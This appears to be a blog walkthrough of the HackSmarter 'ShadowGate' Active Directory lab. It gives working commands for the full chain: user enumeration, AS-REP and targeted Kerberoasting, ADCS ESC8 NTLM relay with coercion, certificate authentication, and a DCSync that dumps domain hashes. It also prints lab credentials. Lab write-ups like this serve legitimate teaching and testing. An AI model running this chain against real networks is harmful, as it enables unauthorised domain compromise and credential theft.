---
title: "HackSmarter ShadowGates Walkthrough  "
date: 2026-05-28 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---


## Scenario : 

ShadowGate recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.


## Solution : 

First we start with an nmap scan : 

```bash
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt
```

<img width="1228" height="691" alt="image" src="https://github.com/user-attachments/assets/257c433b-f28b-42c8-9ac5-e2c3794f10a2" />

From the initial scan , we can tell this is an Active Directory machine , port 88 for Kerberos , LDAP on 389 , and DNS , now since it's AD i will follow this quick checklist for my methdology :

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```
Now let's start by enumerating valid usernames through anonymous access across all available protocols. But first let's add the Hostname , domain name , ... to our Hosts file .

```bash
nxc smb $target -u '' -p '' --generate-hosts-file hosts
```
<img width="1524" height="490" alt="image" src="https://github.com/user-attachments/assets/a9bed9a0-1e02-4d4d-8d59-d4d5c8edb0c6" />

Just add this line to the /etc/hosts file . Now let's start enumerating valid users . 

<img width="1704" height="648" alt="image" src="https://github.com/user-attachments/assets/8c274f85-209c-4f33-b064-19ab1d41ac5a" />

Perfect , to keep usernames : 

```bash
nxc smb $target -u '' -p '' --users | awk '{print $5}' | grep -vE '^\[|^-|^$' | tee users.txt
```

<img width="1344" height="593" alt="image" src="https://github.com/user-attachments/assets/1348be17-76ac-491b-9bd0-c92242c17a7b" />

Now that we got out list , we can try ASREPROASTING . 

```bash
impacket-GetNPUsers  shadow.gate/ -dc-ip $target -usersfile users.txt -outputfile Hashes.txt
```

<img width="1296" height="752" alt="image" src="https://github.com/user-attachments/assets/981b3fcf-34db-4c8f-b0c3-8a1293d9a411" />

Now we can either use Hashcat or John to try and crack the Hash.

<img width="1271" height="733" alt="image" src="https://github.com/user-attachments/assets/708799b7-bbb1-46ee-b5c7-7897f86adf54" />

We do manage to crack it , i also tried Kerberoasting now that we have valid creds but that didn't work , let's check Shares , if we dont find anything we can either test BloodHound , Certipy since there is an ADCS in place , or finally if nothing work try to login if we can via Winrm to try and elevate our privileges to be able to dump hahses . What matters is that we always have something to test or to check so that we don't get stuck . 

Now first thing , i ran certipy to check if our user has any control over a specific template that we can abuse . 

```bash
certipy-ad find -u 'jtrueblood' -p 'blood_brothers' -dc-ip $target -vulnerable .
```
<img width="1178" height="754" alt="image" src="https://github.com/user-attachments/assets/4006ef23-82a0-4d98-a12a-1e00b31ac418" />

Then i decided to run BloodHound just to have a better idea on how the domain is structured , i used netexec as the injestor , then downloaded BloodHound this way : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'jtrueblood' -p 'blood_brothers' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

Now if we check the Outbount Objects for our user Jtrueblood , we find that we have Generic Write over the user BBROWN . 

<img width="1503" height="743" alt="image" src="https://github.com/user-attachments/assets/9fb7d2aa-b8d5-4df7-b141-fbde1a28b503" />

Now if we check the Shortest way from Owned Objects or simply check the BBrown user's groups , we will find that he is part of the ADCS Reader group . 

<img width="1396" height="564" alt="image" src="https://github.com/user-attachments/assets/a8f93925-a016-4a3f-91ce-fb0ebf84c04b" />

Now we can either search how to abuse Generic Write on SpecterOps , or we just check the BloodHound recommendation : 

<img width="1463" height="585" alt="image" src="https://github.com/user-attachments/assets/aa632e65-4492-48bc-b707-17590e05d73a" />

We can attempt Targeted Kerberoasting by forcing an SPN onto a target user account we have write privileges over, then Kerberoast it to obtain a crackable hash  useful if the user has a weak password , Now for Targeted Kerberoasting here are the steps to follow : 

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git 
cd targetedKerberoast.git 
python3 targetedKerberoast.py -v -d "shadow.gate" -u jtrueblood -p "blood_brothers"
```

<img width="1402" height="602" alt="image" src="https://github.com/user-attachments/assets/67dba601-b847-4816-a5ec-28f06413fe92" />

If you get a clock skew error, this is expected , it simply means your machine time doesn't match the DC. Just sync your time to the DC:

```bash
sudo rdate -n <DC-IP>
```

<img width="1742" height="807" alt="image" src="https://github.com/user-attachments/assets/c3fe8d77-4620-42e3-a8fc-172b4a29769c" />

The tool will automatically remove the SPN once it does the kerberoasting . Now let's try to crack the hash : 

<img width="1132" height="620" alt="image" src="https://github.com/user-attachments/assets/c0da5012-d685-46ae-a775-98c05adeaf2c" />

Perfect , now we have valid creds we can check using certipy for vulnerable templates . 

<img width="1891" height="789" alt="image" src="https://github.com/user-attachments/assets/dc9bf682-f194-4a80-9f28-aed3e196a863" />

Perfect we do have an ESC8 Vulnerability since Web Enrollment is enabled over HTTP . Now i decided to follow the guide from Pentest Everything . 

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8

```bash
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8
```

Now first we need to find the ADCS endpoint , in this case we already know it's the Domain Controller , the default location is certsrv/certfnsh.asp : 

<img width="1249" height="607" alt="image" src="https://github.com/user-attachments/assets/d9ebbe10-d171-43c6-8b4b-e50ba2dfab22" />

```bash
impacket-ntlmrelayx -t http://$target/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
```
<img width="1419" height="805" alt="image" src="https://github.com/user-attachments/assets/404fd236-bf40-4675-b820-e222f7511b9d" />

Now for the coercion , i decided to use Netexec . 

```bash
nxc smb $target -u 'BBROWN' -p '12345678' -M coerce_plus -o LISTENER=Our_IP
```

<img width="1915" height="594" alt="image" src="https://github.com/user-attachments/assets/797e4d61-2260-4be8-b664-250692391654" />

It works , now we can request a certificate on Behalf of the coerced account . 

```bash
certipy auth -pfx ./DC01.shadow.gate.pfx -dc-ip $target
```
<img width="1133" height="505" alt="image" src="https://github.com/user-attachments/assets/589db0c5-9006-4d24-8bae-07de7c66ca0d" />

Now we can use this Hash to perform a DC Sync . ( The Hash we got is the DC$ machine account so it has enough privileges to perform a DCSync) 

```bash
impacket-secretsdump 'DC01$'@$target -hashes :57867e655d1abc9f45fd6e954e351531
```

<img width="1222" height="715" alt="image" src="https://github.com/user-attachments/assets/c8cc2cea-426d-41ef-ab5c-c06e0c69f70a" />

The Flag is the KRBTGT Hash . 

That was it for this lab . See you in the next one :) 


